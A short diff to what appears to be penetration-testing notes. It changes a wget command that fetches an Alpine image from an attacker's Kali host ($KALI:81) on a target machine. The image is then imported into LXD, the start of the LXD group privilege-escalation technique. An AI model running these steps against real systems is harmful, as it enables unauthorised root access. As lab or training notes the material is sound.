@@ -151,7 +151,7 @@ python2 -m SimpleHTTPServer 81
 
 ```
 cd /tmp
-wget http://$KALI/alpine-v3.18-x86_64-20231111_1929.tar.gz
+wget http://$KALI:81/alpine-v3.18-x86_64-20231111_1929.tar.gz
 lxc image import ./alpine-v3.18-x86_64-20231111_1929.tar.gz --alias myimage
 lxd init
 lxc image list
